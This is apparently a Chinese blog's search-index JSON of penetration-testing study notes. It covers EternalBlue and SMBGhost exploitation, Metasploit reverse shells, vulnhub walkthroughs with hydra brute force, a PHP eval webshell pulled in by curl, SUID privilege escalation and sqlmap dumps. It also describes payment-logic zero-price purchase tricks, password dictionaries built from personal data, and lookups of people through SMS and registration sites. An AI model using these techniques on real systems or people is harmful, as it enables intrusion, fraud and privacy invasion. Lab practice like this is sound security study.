{"meta":{"title":"文心雕龙","subtitle":"","description":"","author":"明 尘","url":"http://example.com","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"12-07","excerpt":""},{"title":"侠客行","text":"​ 赵客缦胡缨，吴钩霜雪明。​ 银鞍照白马，飒沓如流星。​ 十步杀一人，千里不留行。​ 事了拂衣去，深藏身与名。​ 闲过信陵饮，脱剑膝前横。​ 将炙啖朱亥，持觞劝侯嬴。​ 三杯吐然诺，五岳倒为轻。​ 眼花耳热后，意气素霓生。​ 救赵挥金槌，邯郸先震惊。​ 千秋二壮士，烜赫大梁城。​ 纵死侠骨香，不惭世上英。​ 谁能书阁下，白首太玄经。","path":"about/index.html","date":"12-09","excerpt":""},{"title":"categories","text":"","path":"categories/index.html","date":"12-09","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"12-07","excerpt":""},{"title":"tags","text":"","path":"tags/index.html","date":"12-09","excerpt":""}],"posts":[{"title":"tg注册和永恒之黑","text":"tg注册一、tg的注册：1sms在线接码平台2手机挂代理(收验证码)3手机谷歌套件的发验证码 注册完成后就可以对手机号、QQ号、邮箱进行查询 永恒之黑1.下载好vmware，再安装win10镜像 2.在win10虚拟机上使用cmd命令ipconfig得到win10虚拟机的IP地址 169.254.79.200 使用一个python攻击脚本 ，在地址栏中输入cmd 使用一个python攻击脚本 ，在地址栏中输入cmd CVE-2020-0796-POC 4 使用命令python .\\CVE-2020-0796.py 192.168.102.129对win10虚拟机进行攻击，虚拟机就会显示蓝屏 永恒之蓝漏洞IP地址可能会有变化， 介绍（来自百度百科）：指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件 基础命令收集#进入msf：msfconsole#使用search查找相关漏洞： search ms17-010#使用use进入模块: use 数字#使用info查看模块信息：info#设置poc的连接方式：set payload windows&#x2F;x64&#x2F;meterpreter &#x2F;reverse_tcp#查看模块需要配置的参数：show options#设置参数：set RHOST 192.168.200.4#攻击：exploit &#x2F; run#回退：back 后渗透命令收集#查看当前用户：getuid#进入shell：shell#解决shell乱码：chcp 65001#退出shell：exit#把会话放到后台：background#查看所有会话：sessions#进入某个会话： sessions -i id号#删除会话：sessions -k id号 漏洞复现步骤 1 主机发现 2 漏洞探测 3 漏洞攻击","path":"2024/01/08/tg注册和永恒之黑/","date":"01-08","excerpt":"","tags":[]},{"title":"信息收集","text":"谷歌语法语法 算 符 含 义 应用举例 AND&#x2F;空格 所连接的关键词之间是“与”的关系; 云计算 分布式计算 OR&#x2F;| 所连接的关键词之间是“或”的关系 图片 | 写真 - 所连接的关键词之间是“非”的关系 神雕侠侣 -游戏 （） 在检索式中括号里的运算将优先进行 电子商务 AND (云计算 -分布式计算) “” “”英文双引号中的内容作为一个整体被搜索; 精确匹配搜索 “智能天线” * 通配符-星号*，代表完整的字词; A * B、A * * B这两个是有区别的 Flower * pots &#x2F;Flower * * pots + 强制搜索一般会被自动忽略的搜索关键词，如：who、the、of、am +B ~ 同义符;在搜索词前使用，表示会和同时搜索相近词义的词;示例中会同搜元素Si ~ silicon .. 搜索数字范围限定 手机价格2000..5000 filetype: 把搜索范围限定在特定文件类型中; .pdf&#x2F;.doc&#x2F;.docx&#x2F;.ppt&#x2F;.pptx&#x2F;.xls&#x2F;.xlsx&#x2F;.rtf&#x2F;.txt&#x2F;.swf&#x2F;.ps 霍金 黑洞filetype:pdf site： 把搜索范围限定在特定站点、某一站点特定频道、特定域名后缀中 科技 site:news.163.com inurl: 把搜索范围限定在url链接中 inurl:jiqiao photoshop allinurl: 把搜索范围限定在url链接中, 只不过其后所有关键词均要在url链接中出现 allinurl:jiqiao photoshop intitle 把搜索范围限定在网页标题中 商业 intitle:超级女声 allintitle: 把搜索范围限定在网页标题中; 只不过其后所有关键词均要在网页标题中出现 allintitle:超级女声 张靓颖 intext: 把搜索范围限定在网页正文中; 忽略超链接文本、URL以及题目等 inanchor: 把搜索范围限定在链接锚文本文字中 inanchor:吴清源 anchor: 检索某一作者&#x2F;发明人的论著; 只在Google Scholar中可用 anchor:&#x2F;作者: link： 检索所有链接到某个特定URL网址的网页;只能单独使用 link:163.com cache: Google网页快照 related： 检索与某特定网页类似的网页 related:www.163.com/index.shtml info: 用来显示与某链接相关的一系列搜索; 提供cache、similar-pages、link、related等连接 info:www.sina.com.cn Index of 可以帮助你寻找网络和FTP目录 index of mp3 daterange: 查找在一定的日期或者一定的日期范围内; 只关注被Google收录的时间 location: 指定地区区域内查询关键词相关的网页 wow gold location:France weather: 查询该地区或城市当前的天气状况 weather:北京 stocks: 查询股票信息; 一般源于专业财经网站 stocks:比亚迪 define: 返回包含查询关键词定义的网面 define: 暗网 注意:关键词与命令之间有一个空格;在这些关键字中;请勿在冒号后面接空格;命令需用英文输入,包括冒号。AND、OR、NOT均应大写,而其他算符必须是小写，虽其对检索词完全不区分大小写 Google高级搜索http://www.google.com.hk/advanced_search Google网页搜索帮助中心https://support.google.com/websearch/?hl=zh-Hans 谷歌分类目录http://directory.google.com/ Google对于检索词中的大小写是完全不做区分的;在Google中，检索词的排序方式对于整个检索式具有重要的影响，它将首先匹配按照检索式给出的次序进行搜索。同时它也将优先匹配检索词相互邻接的网页。GOOGLE支持多达132种语言，包括简体中文和繁体中文，可以设置页面语言和搜索语言，可对汉字繁简体进行转换，可以跨语言搜索。Google搜索结果中可对搜索范围进行限制，如：网页的发布更新时间或一个时间段内，搜索结果的类型选择如图片、视频、书籍、应用程序、新闻。 百度语法intitle搜索范围限定在网页标题网页标题通常是对网页内容提纲挈领式的归纳。把查询内容范围限定在网页标题中，有时能获得良好的效果。 site搜索范围限定在特定站点中您如果知道某个站点中有自己需要找的东西，就可以把搜索范围限定在这个站点中，提高查询效率。 例如：百度影音 site:http://www.skycn.com“site:”后面跟的站点域名，不要带“http:&#x2F;&#x2F;”。site:和站点名之间，不要带空格。 inurl搜索范围限定在url链接中网页url中的某些信息，常常有某种有价值的含义。您如果对搜索结果的url做某种限定，可以获得良好的效果。 双引号“”和书名号《》精确匹配查询词加上双引号“”则表示查询词不能被拆分，在搜索结果中必需完整出现，可以对查询词精确匹配。如果不加双引号“”经过百度分析后可能会拆分。查询词加上书名号《》有两层特殊功能，一是书名号会出现在搜索结果中；二是被书名号扩起来的内容，不会被拆分。 书名号在某些情况下特别有效果，比如查询词为手机，如果不加书名号在很多情况下出来的是通讯工具手机，而加上书名号后，《手机》结果就都是关于电影方面的了。 -不含特定查询词查询词用减号-语法可以帮您在搜索结果中排除包含特定的关键词所有网页。 例子：电影 -007 查询词“电影”在搜索结果中，“007”被排除在搜索结果中。 +包含特定查询词查询词用加号+语法可以帮您在搜索结果中必需包含特定的关键词所有网页。例子：电影 +123 查询词“电影”在搜索结果中，“123”被必需被包含在搜索结果中。 Filetype搜索范围限定在指定文档格式中查询词用Filetype语法可以限定查询词出现在指定的文档中，支持文档格式有pdf，doc，xls，ppt，rtf,all(所有上面的文档格式)。对于找文档资料相当有帮助。 百度高级搜索页面通过访问http://www.baidu.com/gaoji/advanced.html网址，百度高级搜索页面将上面的所有的高级语法集成，用户不需要记忆语法，只需要填写查询词和选择相关选项就能完成复杂的语法搜索。 域名查询站长之家域名Whois查询 - 站长之家 (chinaz.com) 在线子域名爆破 (zcjun.com) fofahttps://fofa.info/ 企查查 - 企业工商信息查询系统_查企业_查老板_查风险就上企查查! (qcc.com) 支付逻辑漏洞支付逻辑漏洞是指系统的支付流程中存在业务逻辑层面的漏洞 常见支付流程：选择商品和数量——选择支付及配送方式——生成订单编号——订单支付选择——完成支付 如：最常见的支付逻辑漏洞通常是由于服务器端没有对客户端请求数据中的金额、数量等敏感信息进行效验导致。一般漏洞产生在电子商务类应用中。 支付逻辑漏洞一般分为四类：1.支付过程中可以修改支付金额2.可以将订单中的商品数量修改为负值3.请求重放导致4.其他问题（程序异常，其他参数修改导致问题等）其他支付问题补充：修改支付状态、修改附属值（优惠券积分等）、修改支付接口、替换多个订单、重复支付等。 支付逻辑漏洞之修改订单数量：1、登录网站，选择购买一个商品并抓取数据包2、找到其中代表商品数量的参数，将参数的值修改为负数3、发送数据包，生成订单，观察订单是否有效，是否能进入支付页面4、完成支付 可能产生零元购漏洞的地方一，参数包里面没有价格，或者价格跟商品id 校验，导致无法修改商品金额1，隐藏商品的模糊测试，商品id2，第一个:商品下单的处导致3，第二个，商品购买处导致4，购物车未校验加入零元商品商品5，第四个是，支付宝接口和商品接口未校验导致商品任意购买6.商品数量校验导致零元购，7.附带商品导致支付漏洞 8.四舍五入导致支付漏洞系统的支付和微信的支付校验导致(提现) 0.009 0.01 9.使用过红包的订单:有一个支付宝的订单号 有效期是15 分钟 商家对接支付宝取消订单红包返回无限使用 并发漏洞(服务器对功能点的多线程处理):优惠券，微博的点赞关注 取消点赞，取。消关注 优惠商品下单所有的都能并发 弱口令网站管理、运营人员由于安全意识不足，为了方便、避免忘记密码等，使用了非常容易记住的密码，或者是直接采用了系统的默认密码等。 攻击者利用此漏洞可直接进入应用系统或者管理系统，从而进行系统、网页、数据的篡改与删除，非法获取系统、用户的数据，甚至可能导致服务器沦陷。 弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。弱口令指的是仅包含简单数字和字母的口令，例如“123456”、“abc”等，因为这样的口令很容易被别人破解，从而使用户的计算机面临风险，因此不推荐用户使用。 src 统一教育src分析 通过社工定制字典库​ 有很多人为了方便记忆自己的密码，经常将个人身份信息嵌入其中。如果是对某用户有一定的了解，通过收集用户信息，包括生日，sfz号，手机号，用户名，车牌号，网站名称，地址等（包含中文信息可以使用拼音），可以通过暴力破解的方式尝试出用户密码。而且绝大多数人都会将多个账户设定为相同的密码，即如果你破解了某人的QQ密码，很可能你也找到了他的论坛、邮箱、微博、游戏账号密码…… 例如：姓名 邮箱 生日 用户名 特殊数字 常用密码 伴侣信息 手机号码 ​ 当针对某个公司&amp;团体生成弱口令字典时，可以在从一些网站收集相关信息 ​ 全国社会组织查询http://www.chinanpo.gov.cn/search/orgindex.html天眼查-商业安全工具_企业信息查询_公司查询_工商查询_企业信用信息系统https://www.tianyancha.com/工业和信息化部ICP&#x2F;IP地址&#x2F;域名信息备案管理系统http://www.beian.miit.gov.cn/publish/query/indexFirst.action类似这样的网站还有很多 ​ 另外现在越来越多的后台弱口令使用@、*、&amp;以及.等特殊字符作为增强密码复杂度的手段，虽然增加了爆破成本但是依然有规律可循。比如test@公司名或者当年年份@公司名，可以使用字典生成器来有针对性的生成字典。（https://github.com/HongLuDianXue/BaiLu-SED-Tool） 可以在github上面搜索一些字典库，也可以自己不断收集整理 通用类型危害程度常见定级中小型厂商中危：常见类型有逻辑漏洞、未授权访问、任意文件读取、敏感信息泄露、XSS等等&#x2F;&#x2F;&#x2F;价格为5-10kb一个高危：SQL注入、getshell、命令执行、代码执行等等（框架漏洞不属于厂商通用，如weblogic,thinkphp,shiro等公开漏洞）&#x2F;&#x2F;&#x2F;价格为10kb-无上限大型厂商中危：常见类型有逻辑漏洞、未授权访问、任意文件读取、敏感信息泄露、XSS等等&#x2F;&#x2F;&#x2F;价格为100-无上限高危：SQL注入、getshell、命令执行、代码执行等等&#x2F;&#x2F;&#x2F;价格为500-无上限 越丑的站，越有可能存在洞。Asp aspx 存在漏洞的可能更大登陆口没得验证码的可能存在 漏洞提交平台漏洞盒子https://planet.vulbox.com/ 补天漏洞响应平台https://www.butian.net/Reward/plan/1 教育漏洞平台https://src.sjtu.edu.cn","path":"2024/01/07/信息收集/","date":"01-07","excerpt":"","tags":[{"name":"百度谷歌语法","slug":"百度谷歌语法","permalink":"http://example.com/tags/%E7%99%BE%E5%BA%A6%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/"},{"name":"支付逻辑漏洞","slug":"支付逻辑漏洞","permalink":"http://example.com/tags/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"name":"弱口令","slug":"弱口令","permalink":"http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"}]},{"title":"virtual和pikachu","text":"pikachupikachu是一个漏洞练习平台。其中包含了常见的web安全漏洞， Burt Force(暴力破解漏洞)XSS(跨站脚本漏洞)CSRF(跨站请求伪造)SQL-Inject(SQL注入漏洞)RCE(远程命令&#x2F;代码执行)Files Inclusion(文件包含漏洞)Unsafe file downloads(不安全的文件下载)Unsafe file uploads(不安全的文件上传)Over Permisson(越权漏洞)..&#x2F;..&#x2F;..&#x2F;(目录遍历)I can see your ABC(敏感信息泄露)PHP反序列化漏洞XXE(XML External Entity attack)不安全的URL重定向SSRF(Server-Side Request Forgery) 下载pikachu，github地址：https://github.com/zhuifengshaonianhanlu/pikachu 比较小只有几兆，然后将下载好的压缩包解压到你安装phpstudy目录中的www文件夹下。 打开网站根目录www,进入C:\\phpstudy_pro\\WWW\\pikachu-master\\inc, 配置config.inc.php文件 define(‘DBPW’, ‘root’);&#x2F;&#x2F;将root修改为连接mysql的密码，如果改了还是连接不上，请先手动连接下你的数据库，确保数据库服务没问题在说！ phpstudy打开网站，进入pikachu, 单击红色的初始化之后就可以进行学习之旅了。 ​ “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。​ 理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高 bp暴力破解打开bp,打开内嵌浏览器搜索pikachu Burp抓包，可以开启拦截。 右键发送到Intruder 选择攻击类型多个Payload集合 配置payload的插入位置 可以用自带的字典，也可以自己添加配置。 然后开始攻击 破解结果。 yakit暴力破解打开网站，yakit抓包， 在要攻击的位置插入字k典，插入模糊测试字典标签，可以 扩充一些自己觉得可能的用户和密码。 发送请求 破解结果 virtrualbox下载VirtualBox官网地址如下：https://www.virtualbox.org/ 镜像文件下载： ubuntu官网地址如下：https://ubuntu.com/ windows官网地址如下：https://www.microsoft.com/zh-cn/ 阿里官网镜像地址如下：https://developer.aliyun.com/mirror/ 你可以在Downloads中找到合适自己当前电脑系统版本的软件安装包下载，下载完成后默认安装即可。 安装然后，我们双击打开安装包，开始安装，点击【下一步】按钮。 选择安装路径，自定义或默认，个人建议自定义。 之后出现的默认就行了，出现安装界面就点安装即可。 usb设备选1 网络选仅主机网络 启动 下载MoneyBox.ova​ 这是vulnhub上的一个简单靶场，网上冲浪的时候发现就下载下来做了一下，发点靶场的渗透过程，就当是学习笔记了。靶场地址http://www.vulnhub.com/entry/moneybox-1,653/#download​ 如果VMware里配置靶场环境有问题的话就下个Virtualbox，把靶机的ova文件导入到Virtualbox里。Virtualbox的下载路径https://www.virtualbox.org/ 虚拟网络编辑器桥接模式， vulnhub-MONEYBOX查看IP地址 命令关闭重启ifdown eth0ifup eth0 网络扫描arp-scan -l -i etho 执行 ARP 主机发现并列出与本地网络连接的设备。-l选项表示进行局域网扫描，-i eth0指定要扫描的网络接口。通过这个命令，你可以列出当前局域网上的设备，并且获取这些设备的IP地址和MAC地址等信息。 nmap -p 1-10000 192.168.56.101 网络搜索192.168.56.101 端口扫描和目录枚举nmap -p 21,22,80 -sC 192.168.56.101: 这个命令使用了 nmap 工具，它针对指定的 IP 地址（这里是 192.168.56.101）执行端口扫描。-p 21,22,80 指定了要扫描的端口列表（在这种情况下是21、22和80端口）。通过执行这个命令，你可以确定目标主机上这些特定端口的状态（开放、关闭或过滤）。-sC：启用默认脚本扫描。这将运行一组默认脚本来探测目标主机可能存在的安全漏洞或弱点。 ​ (此处可发现Anonymous账号)（这是一个使用 nmap 工具进行端口扫描和脚本扫描的命令。具体来说，该命令指定了要扫描的端口（21、22和80），并启用了默认的脚本扫描。nmap 是一个常用的网络扫描工具，用于发现和识别目标主机上开放的端口和提供的服务。通过指定不同的扫描选项和参数，可以对目标主机进行多种类型的扫描，包括端口扫描、操作系统识别、服务和版本识别等。在你提供的命令中，-p 21,22,80 参数指定了要扫描的端口，即 21、22 和 80。-sC 参数启用了默认的脚本扫描，这将运行一系列内置的脚本来探测和识别目标主机上的服务。192.168.56.101 是目标主机的 IP 地址，这是你要对其进行扫描的目标。） 发现ftp拥有允许匿名ftp登录的漏洞，Anonymous:Anonymous登录 dirsearch -u “http://192.168.56.101“ -x 403,404,401(查出blogs目录，查看页面得到S3cr3t-T3xt) 打开view-source:http://192.168.56.101/blogs/ FTP命令通常需要指定用户名和密码来进行连接 ftp 192.168.56.101 Anonymous:Anonymous登录 lsget trytofind.jpgexit lsstrings trytofind.jpg apt install steghide steghide extract -sf trytofind.jpg 打开view-source:http://192.168.56.101/S3cr3t-T3xt/ 密钥3xtr4ctd4t4 cat data.txt hydra -l renu -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;Passwords&#x2F;darkweb2017-top10000.txt ssh:&#x2F;&#x2F;192.168.56.101ssh &#114;&#101;&#110;&#117;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#53;&#x36;&#46;&#49;&#48;&#49; lscat user1.txtls -al cat .bash_historyssh &#x6c;&#x69;&#x6c;&#x79;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#53;&#54;&#x2e;&#49;&#x30;&#x31; ls -alcat user2.txtsudo perl -e ‘exec”&#x2F;bin&#x2F;sh”;’cd &#x2F;rootls -alcat .root.txt 小米范端口扫描工作原理： 快速端口扫描。 对开放的端口快速识别http&#x2F;https。 如果识别到为http&#x2F;https，则抓取首页title、Server头，响应头。 如果端口非http&#x2F;https，则通过socket方式抓取其banner信息。 功能及特性：1、工具内置浏览器插件，另外针对开放端口支持右键使用系统默认浏览器打开。 2、支持数据的导出、导入。 3、支持多种ip格式： 192.168.0.0&#x2F;24 192.168.1.1-123 192.168.1.123 www.baidu.com 4、支持灵活的端口格式： 1-1024,8080,8000,8000-9000 5、自动识别http&#x2F;https，非http&#x2F;https自动抓取banner。 6、支持自定义超时、线程数。 7、支持实时任务创建，新建的任务会自动放入到任务队列。 8、支持一键提取所有的http或https端口的URL。 下载相关下载链接：&#x2F;&#x2F;download.csdn.net&#x2F;download&#x2F;qq_37113223&#x2F;14809786?utm_source&#x3D;bbsseo 文件名web finder，请使用java1.8运行 改名成web_finder_2.9.jar，java -jar web_finder_2.9.jar 在java1.8的bin目录cmd,运行java -jar web_finder_2.9.jar 扫描新建扫描 输入域名，例如www.baidu.com","path":"2024/01/04/virtual和picachu/","date":"01-04","excerpt":"","tags":[{"name":"pikachu","slug":"pikachu","permalink":"http://example.com/tags/pikachu/"},{"name":"virtrualbox","slug":"virtrualbox","permalink":"http://example.com/tags/virtrualbox/"},{"name":"小米范端口扫描","slug":"小米范端口扫描","permalink":"http://example.com/tags/%E5%B0%8F%E7%B1%B3%E8%8C%83%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"}]},{"title":"渗透和靶机","text":"一.基本流程：渗透整体分为三部分：前渗透也被称为外网打点，权限维持以及后渗透，权限维持也可划分到前渗透中。权限维持也包括提权，主机信息收集web打点，apk打点(安卓手机打点)，钓鱼等等最终目的都是为了获得权限。结构示意图： 二.web打点信息收集分情况进行处理：已知ip，已知域名，已知邮箱。 2.1已知ip2.1.1基于主机可以进行端口扫描，从而确定端口对应的服务，一共有65536(0~65535)个端口。浏览器也是如此，在浏览器上每开启一个页面都要在本地建立端口于远端服务器进行连接。在web服务(浏览器)上就可以进行目录扫描，通过目录扫描发现信息泄露，如果没有进行校验还会发生越权或者目录穿越。web服务上面还会发现ssh，ftp，smb，RDP，寻找API(可能存在is之中)，根据ico图标找相关站点等服务，其中的密码都可以进行爆破。简单的用户名和密码，组织统一注册的用户名和密码，历史密码拼接容易被爆破。还可以进行强制爆破。以上种种情况基于主机。 2.1.2反查根据ip地址反查域名通过微步在线进行反查通过在微步进行服务器ip地址的查询可以看到绑定的图标以及ip解析的域名，相关网站，网页的js以及ip开饭的端口等信息均可以查到。根据图标也可能会被查到相关信息。微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区 2.1.3ip定位2.2已知域名2.2.1域名：例如：www.baidu.com就是域名 域名（Domain Name）是用于在互联网上标识和定位网站或互联网资源的人类可读的地址。它是将IP地址（用于在网络上唯一标识设备）转化为易于记忆的字符序列的方式。域名的结构通常由多个部分组成，以点（.）作为分隔符。最顶层的部分被称为顶级域名（Top-Level Domain，简称TLD），如.com、.org、.net等。顶级域名可以按照国家&#x2F;地区（如.cn表示中国）、通用（如.com表示商业）、组织类型（如.edu表示教育机构）等进行分类。 在顶级域名下面，可以添加二级域名和更多级别的子域名。 域名的作用是方便用户记忆和使用，它提供了一个更友好和可读性更高的方式来访问网站和互联网资源，而不是依赖于记忆一长串数字的IP地址。当用户在浏览器中输入域名时，系统将通过域名解析将其转换为相应的IP地址，以便正确访问目标资源。 2.2.2域名备案https://beian.miit.gov.cn/通过这个地址查看域名备案https://beian.miit.gov.cn/#/Integrated/index通过域名备案可以查到邮箱，姓名，主体，服务备案号，通过备案号可以查其他相关网站。通过备案号加上引号进行百度搜索 2.3已知邮箱https://www.reg007.com/通过这个网站搜索邮箱，手机号可以看到注册过的一些相关网页或者应用，不过比较鸡肋的是必须证明是本人进行查询，还需要发送验证码。你注册过哪些网站？一搜便知 - REG007已知邮箱可以查询到姓名，手机号，历史密码，身份证，户口本，淘宝记录。 打靶一.准备工作：1.准备好DC1靶机和kali linux虚拟机两台设。2.由于一开始不知道DC1靶机的ip地址，可以将两台设备调整为nat模式，对DC1进行查看物理地址并记录下来 1DC1的mac地址：00:0C:29:0D:49:7C 3.kali linux虚拟机通过ifconfig找到当前的ip地址 1etho：192.168.17.132 4.通过nmap端口扫描找到DC1的IP地址：namp -sn 192.168.17.132&#x2F;24 “其中-sn”参数指定了 nmap 工具执行 “Ping Scan”，即使用 ICMP 回应来确定目标主机是否存活。 12命令：namp -sn 192.168.17.132/24得出DC1的IP：192.168.17.133 二.获取信息：1.通过此命令查看DC1的基本信息：nmap -sS 192.168.17.133 -A2.通过此命令查看DC1的全端口信息：nmap -p- 192.168.17.1333.确定版本：nmap -p 80 -sV 192.168.17.133,由于自己试过无法主机无法到达，因为两个虚拟机都选择的是nat模式所以无法互相拼通。再在kali机上面打开浏览器搜索192.168.17.133:80,关键字是:Drupal Site ,用sql注入进行尝试发现没啥用处，邮箱注册发送也没用4.进行目录扫描：dirsearch -u 192.168.17.133 -x 403，404 -t 50在网页后面加上&#x2F;robots.txt。这个文件是一个爬虫文件。robots.txt 是一个用于指导网络爬虫的文件。它是位于网站根目录下的一个文本文件，用于向搜索引擎和其他网络爬虫提供关于网站爬取规则的指示。当搜索引擎的爬虫访问一个网站时，它会首先查找并读取 robots.txt 文件。该文件中包含了一些指令，告诉爬虫哪些网页可以被爬取，哪些不可以。通过 robots.txt，网站管理员可以控制搜索引擎爬虫在访问网站时的行为，例如禁止爬虫访问某些特定的页面、目录或文件。再去看一下&#x2F;UPGRADE.txt可以发现Drupal是一个框架，当前版本是7.0，百度搜索一下，发现版本比较老，可能存在漏洞。 三.msf尝试进行攻击：启动msf:msfconsole搜索框架漏洞：search drupal发现存在这些漏洞，一个个进行尝试，最后发现第二个能够成功。尝试用use 0会话没有创建成功，用use 2成功创建会话。show options查看必须要设置的选项set rhosts 192.168.17.133#这个ip是DC1的iprun一下出现这个说明伪终端创建成功。 四.尝试提权：shell一下，ls查看一下： pwd当前位置，whoami我是谁cat flag1.txt CMS是什么？CMS 是内容管理系统（Content Management System）的缩写。它是一种用于创建、编辑、管理和发布内容的软件系统或工具。一个 CMS 提供了一系列的功能和工具，使用户可以轻松地创建、组织和发布内容，无需编写代码或进行复杂的技术操作。它通常包括用户管理、内容编辑、模板设计、发布管理等功能。使用 CMS，用户可以创建和管理各种类型的网站，例如博客、新闻门户、企业网站、电子商务网站等。CMS 提供了易于使用的界面和工具，允许用户通过简单的操作来添加、编辑或删除页面内容、图像、视频、文章等，而无需涉及复杂的编程和设计知识。一些常见的 CMS 包括 WordPress、Drupal、Joomla 等，它们都是广泛用于构建和管理网站的流行软件系统。通过使用 CMS，用户能够方便地管理网站的内容，使网站的维护和更新更加高效和简单。 上传文件：where curl #curl类似于一个命令行工具或者库输入curl出现帮助手册说明存在。curl www.baidu.com在桌面新建一个1.php 1234&lt;?php@eval($_GET[cmd]);?&gt; 重新开一个cmd窗口输入python -m http.server 80#意思是说将当前目录设置为网站根目录。http://192.168.17.132 -o 1.phpls发现上传成功。 cat 1.php出现其他的内容说明上传的方式错了，上传了个下载连接地址。正确的方式是这样的：curl http://192.168.17.132/1.php -o 2.phpcat 2.php成功之后调用系统命令执行函数。192.168.17.133&#x2F;2.php?cmd&#x3D;sytem(ls);通过木马获取权限，这是一种办法。 五.短暂获取权限：python加强一下shell权限：python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”#使用交互shell 1python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; find提权：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null#这里利用SUID进行提权，查看SUID的二进制可执行文件。 1find / -user root -perm -4000 -print 2&gt;/dev/null 解释：find 是一个命令，用于在文件系统中搜索文件或目录。&#x2F; 是搜索的起始点，表示从根目录开始搜索。-user root 是一个选项，表示搜索属主为 root 的文件或目录。-perm -4000 是另一个选项，表示搜索权限设置为 4000（八进制表示）的文件或目录。其中的 - 表示匹配减去指定权限后的结果，4000 则对应 SUID 权限位。-print 是一个选项，表示找到匹配的文件或目录时打印出它们的路径。最后的 2&gt;&#x2F;dev&#x2F;null 是将搜索过程中产生的错误信息（标准错误输出）重定向到 &#x2F;dev&#x2F;null 设备中，以避免显示错误信息。find &#x2F; -name cron.php -exec “&#x2F;bin&#x2F;sh” ; #利用find获取root权限id查看当前的用户。cd &#x2F;root切换到root根目录ls 发现最终的flagcat theflnalfalg.txt 查看文件内容","path":"2024/01/02/渗透和靶机/","date":"01-02","excerpt":"","tags":[]},{"title":"sqlmap","text":"Sqlmap使用（必备命令）一、Sqlmap注入篇Sqlmap是一个专业的SQL注入工具，用法也很多，具体可以用”sqlmap -hh”查看完整的命令帮助文档，这只是一些最常用的Sqlmap用法。 1、检查注入点【get】 sqlmap -u “url” 【post】sqlmap -u “url” –data&#x3D;”参数” 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1“ –data&#x3D;”id&#x3D;1” 2、爆所有数据库信息 –dbs（爆所有数据库信息） 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ –dbs 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-15/“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –dbs –current-db（爆当前数据库信息） 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ –current-db 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” –current-db 3、列出指定数据库所有的表名 -D 数据库名 –tables 例如：列出数据库名为security的所有数据表 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ -D security –tables 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-15“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -D security –tables 4、列出指定表名的所有列名 –columns 所有列名 例如：数据库pikachu中users表所有字段名 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ -D security -T users –columns 因为图一样，后面只列一个图。 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-15“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -D security -T users –columns 5、dump打印输出表名指定列名字段的值数据 -C 指定需要显示数值的字段名，不指定默认显示全部字段 例如：数据库pikachu中users表中username,password字段的值 【get字符型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-1/?id=1“ -D security -T users -C username,password –dump 【post数字类型】root@kali:&#x2F;# sqlmap -u “http://192.168.2.64/sqli/Less-15“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -D security -T users -C username,password –dump 6、Sqlmap -r 使用使用Fiddler或者Burp Suite抓包将get或者post请求保存为.txt文件，然后使用Sqlmap -r “txt文件路径”调用，这样就不用输入参数和cookie了。 例如：登录成功后修改个人信息POST请求存在sql注入，将该post请求拦截后保存.txt文件，就不需要在Sqlmap中输入参数和cookie。 20.txt GET &#x2F;sqli&#x2F;Less-20&#x2F;index.php HTTP&#x2F;1.1 Host: 192.168.2.64 Accept-Language: zh-CN,zh;q&#x3D;0.9 Cookie: uname&#x3D;admin Upgrade-Insecure-Requests: 1 Cache-Control: max-age&#x3D;0 Accept-Encoding: gzip, deflate User-Agent: 